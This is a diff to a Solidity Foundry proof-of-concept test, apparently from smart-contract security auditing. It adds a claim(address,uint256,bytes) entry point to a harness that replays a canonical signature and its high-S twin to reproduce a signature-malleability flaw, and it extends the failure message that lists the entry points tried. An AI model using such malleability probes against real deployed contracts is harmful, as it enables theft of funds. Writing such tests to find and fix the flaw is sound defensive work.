@@ -107,6 +107,14 @@ contract PoC is Test {
         if (bytes(used).length > 0) return used;
         used = _attempt(attacker, before, "execute(bytes32,bytes)", abi.encodeWithSignature("execute(bytes32,bytes)", MESSAGE_HASH, sig), abi.encodeWithSignature("execute(bytes32,bytes)", MESSAGE_HASH, sig2));
         if (bytes(used).length > 0) return used;
+        used = _attempt(
+            attacker,
+            before,
+            "claim(address,uint256,bytes)",
+            abi.encodeWithSignature("claim(address,uint256,bytes)", attacker, 1 ether, sig),
+            abi.encodeWithSignature("claim(address,uint256,bytes)", attacker, 1 ether, sig2)
+        );
+        if (bytes(used).length > 0) return used;
 
         bytes memory canonicalPermit = abi.encodeWithSignature(
             "permit(address,address,uint256,uint256,uint8,bytes32,bytes32)",
@@ -146,7 +154,7 @@ contract PoC is Test {
 
         assertTrue(
             bytes(used).length > 0,
-            "no signature-malleability entry point reproduced. Tried claim(bytes), execute(bytes), redeem(bytes), claim(bytes32,bytes), execute(bytes32,bytes), permit(address,address,uint256,uint256,uint8,bytes32,bytes32), first with a canonical signature then with its high-S twin. This does NOT establish safety: the entry may have another name or signature, the digest/domain may differ from MESSAGE_HASH, or the target may enforce low-S elsewhere."
+            "no signature-malleability entry point reproduced. Tried claim(bytes), execute(bytes), redeem(bytes), claim(bytes32,bytes), execute(bytes32,bytes), claim(address,uint256,bytes), permit(address,address,uint256,uint256,uint8,bytes32,bytes32), first with a canonical signature then with its high-S twin. This does NOT establish safety: the entry may have another name or signature, the digest/domain may differ from MESSAGE_HASH, or the target may enforce low-S elsewhere."
         );
     }
 }
